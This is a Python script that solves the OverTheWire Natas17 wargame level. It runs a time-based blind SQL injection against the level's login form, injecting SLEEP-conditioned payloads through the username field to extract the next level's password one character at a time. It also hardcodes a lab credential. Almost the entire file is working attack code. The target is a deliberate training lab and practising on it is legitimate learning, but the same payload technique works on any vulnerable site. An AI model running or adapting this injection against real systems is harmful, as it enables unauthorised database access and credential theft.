import requests
from requests.auth import HTTPBasicAuth
import string
import time

# Configuration
url = "http://natas17.natas.labs.overthewire.org"
username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"  # Replace with your actual natas17 password

# Setup
auth = HTTPBasicAuth(username, password)
extracted_password = ""
charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9

print("="*60)
print("NATAS17 - Time-Based Blind SQL Injection")
print("="*60)
print(f"Target: {url}")
print(f"Charset: {charset}")
print("="*60)

# Test connection first
print("\n[*] Testing connection...")
try:
    r = requests.get(url, auth=auth, timeout=5)
    if r.status_code == 200:
        print("[+] Connection successful!")
    else:
        print(f"[-] Connection failed with status: {r.status_code}")
        exit(1)
except Exception as e:
    print(f"[-] Connection error: {e}")
    exit(1)

# Test if time-based injection works
print("\n[*] Testing time-based injection...")
test_payload = 'natas18" AND SLEEP(3) #'
start = time.time()
try:
    r = requests.post(url, auth=auth, data={'username': test_payload}, timeout=6)
    elapsed = time.time() - start
    print(f"[+] Test delay: {elapsed:.2f} seconds")
    if elapsed < 2.5:
        print("[-] Warning: Delay might be too short. Continuing anyway...")
except Exception as e:
    print(f"[!] Test error: {e}")

# Extract password character by character
print("\n[*] Extracting password...")
print("-"*60)

for position in range(1, 33):  # Natas passwords are typically 32 chars
    found = False
    
    for char in charset:
        # Construct the SQL injection payload
        # This will make the query sleep if the character matches
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{position},1)=BINARY "{char}",SLEEP(2),0) #'
        
        try:
            start_time = time.time()
            r = requests.post(
                url, 
                auth=auth, 
                data={'username': payload},
                timeout=4
            )
            elapsed_time = time.time() - start_time
            
            # If it took ~2 seconds, we found the character
            if elapsed_time >= 1.8:
                extracted_password += char
                print(f"[+] Position {position:2d}: '{char}' | Password: {extracted_password}")
                found = True
                break
                
        except requests.Timeout:
            # Timeout means SLEEP was triggered - we found it!
            extracted_password += char
            print(f"[+] Position {position:2d}: '{char}' | Password: {extracted_password}")
            found = True
            break
            
        except Exception as e:
            print(f"[!] Error at position {position}, char '{char}': {e}")
            continue
    
    if not found:
        print(f"\n[-] Could not find character at position {position}")
        print(f"[-] Password so far: {extracted_password}")
        print("\n[!] This might mean:")
        print("    1. Password is shorter than expected")
        print("    2. Network issues")
        print("    3. Character not in charset")
        break

print("\n" + "="*60)
print(f"[+] FINAL PASSWORD: {extracted_password}")
print("="*60)
print(f"\n[+] Password length: {len(extracted_password)} characters")
print("\nUse this password to access natas18!")